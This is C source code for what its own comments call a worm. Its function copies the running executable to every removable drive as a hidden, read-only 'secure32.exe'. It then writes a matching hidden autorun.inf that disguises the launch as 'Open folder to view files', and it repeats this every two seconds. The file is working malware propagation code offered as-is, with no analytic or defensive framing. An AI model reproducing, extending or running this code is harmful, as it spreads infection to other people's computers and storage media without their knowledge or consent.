#include "global.h"

void spread_external()
{
//String with the contents of AutoRun
    LPSTR txtAutoRun="\r\n\r\n[autorun]\r\nicon=%SystemRoot%\\system32\\SHELL32.dll,4\r\naction=Open folder to view files\nshellexecute=secure32.exe\nUseAutoPlay=1";
    DWORD dwBytes;

    LPSTR AppName=(LPSTR)GlobalAlloc(GPTR,MAX_PATH);
    GetModuleFileName(0,AppName,MAX_PATH);

    LPSTR lpUnidades=(LPSTR)GlobalAlloc(GPTR,512);

    while (1)
    {
//The API returns the string length
        DWORD numUnidades=GetLogicalDriveStringsA(512,lpUnidades);

//Split the string length between 4 to obtain the number of units
//Example: 'A:\() void B:\ () void C:\ (null) null ()'
        numUnidades=numUnidades/4;

//We backup the pointer to move it
        LPSTR lpTemp=lpUnidades;

        DWORD i=0;
        for (i;i<numUnidades;i++)
        {
//Check if the drive is removable and that it is not a floppy drive
            if ((GetDriveType(lpTemp) == DRIVE_REMOVABLE && lpTemp[0]!='A'))
            {
//We create pathways for the Worm and Autorun
                LPSTR WormPath=(LPSTR)GlobalAlloc(GPTR,MAX_PATH);
                lstrcat(WormPath,lpTemp);
                lstrcat(WormPath,"secure32.exe");

                LPSTR AutorunPath=(LPSTR)GlobalAlloc(GPTR,MAX_PATH);
                lstrcat(AutorunPath,lpTemp);
                lstrcat(AutorunPath,"autorun.inf");

                if (!PathFileExistsA(WormPath))
                {
//Copy worm to usb
                    CopyFileA(AppName,WormPath,FALSE);

//Set the attributes to hidden, system read-only to the worm
                    SetFileAttributesA(WormPath,FILE_ATTRIBUTE_HIDDEN+FILE_ATTRIBUTE_SYSTEM+FILE_ATTRIBUTE_READONLY);

//Create the AutoRun
                    HANDLE hFile=CreateFileA(AutorunPath,GENERIC_WRITE,0,0,CREATE_ALWAYS,0,0);
                    DWORD szAutoRun=lstrlenA(txtAutoRun);
                    WriteFile(hFile,txtAutoRun,szAutoRun,&dwBytes,0);
                    CloseHandle(hFile);

//Set the attributes to hidden, system and read-only on the autorun
                    SetFileAttributesA(AutorunPath,FILE_ATTRIBUTE_HIDDEN+FILE_ATTRIBUTE_SYSTEM+FILE_ATTRIBUTE_READONLY);
                }
            }

            lpTemp=lpTemp+4;
        }

        GlobalFree(lpTemp);
        Sleep(2000);
    }
}



